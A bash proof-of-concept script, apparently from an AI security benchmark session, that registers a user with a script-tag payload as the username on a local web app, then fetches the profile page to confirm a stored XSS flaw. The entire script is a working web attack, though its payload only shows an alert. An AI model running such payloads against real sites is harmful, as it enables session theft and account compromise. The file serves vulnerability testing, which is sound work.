#!/bin/bash
# POC: Demonstrates stored XSS vulnerability in user profile via unescaped username field. Registers a user with JavaScript in the username and verifies it's executed when viewing the profile.
# Target: ./repo
# Created: 2025-12-01T16:09:11.619Z
# Session: benchmark-XBEN-099-24-minc74t1

# Stored XSS in User Profile via Username - POC
# This script demonstrates a stored XSS vulnerability where JavaScript can be injected
# through the username field and executed when viewing the profile

TARGET_URL="${1:-http://localhost:3000}"

echo "[*] Stored XSS in User Profile via Username POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Register a user with XSS payload in the username
echo "[+] Step 1: Registering user with XSS payload in username..."
XSS_PAYLOAD='<script>alert("XSS")</script>'
USERNAME_ENCODED=$(printf %s "$XSS_PAYLOAD" | jq -sRr @uri)

REGISTER_RESPONSE=$(curl -s -X POST "$TARGET_URL/register" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d "username=$USERNAME_ENCODED&password=test123")

echo "[*] Registration response:"
echo "$REGISTER_RESPONSE"
echo ""

# Extract userId from response
USER_ID=$(echo "$REGISTER_RESPONSE" | grep -oP '"userId":"?\K[^"]*' | head -1)

if [ -z "$USER_ID" ]; then
  # Try alternative parsing
  USER_ID=$(echo "$REGISTER_RESPONSE" | grep -oP 'userId["\s]*[:=\s]*["\s]*\K[^"}\s]+' | head -1)
fi

if [ -z "$USER_ID" ]; then
  echo "[-] Failed to extract userId from registration response"
  echo "[-] Full response: $REGISTER_RESPONSE"
  exit 1
fi

echo "[+] User registered successfully with ID: $USER_ID"
echo ""

# Step 2: Access the profile and verify XSS payload is not escaped
echo "[+] Step 2: Accessing user profile at /profile/$USER_ID..."
PROFILE_RESPONSE=$(curl -s -X GET "$TARGET_URL/profile/$USER_ID")

echo "[*] Profile response:"
echo "$PROFILE_RESPONSE"
echo ""

# Step 3: Check if the XSS payload is present and unescaped
if echo "$PROFILE_RESPONSE" | grep -q '<script>alert("XSS")</script>'; then
  echo "[✓] VULNERABILITY CONFIRMED: Unescaped <script> tag found in profile HTML"
  echo "[✓] Stored XSS payload is executable in the profile response"
  echo "[✓] An attacker can inject arbitrary JavaScript via username field"
  exit 0
elif echo "$PROFILE_RESPONSE" | grep -q '<script>'; then
  echo "[✓] VULNERABILITY CONFIRMED: Unescaped script tags found in profile HTML"
  exit 0
elif echo "$PROFILE_RESPONSE" | grep -q 'alert("XSS")'; then
  echo "[✓] VULNERABILITY CONFIRMED: XSS payload present in profile (may be partially escaped)"
  exit 0
else
  echo "[-] XSS payload not found in profile response or properly escaped"
  echo "[-] Checking if HTML entities are properly used..."
  if echo "$PROFILE_RESPONSE" | grep -q '&lt;script&gt;'; then
    echo "[✓] Payload is properly HTML-escaped with entities"
    exit 1
  fi
  echo "[-] Could not verify vulnerability"
  exit 1
fi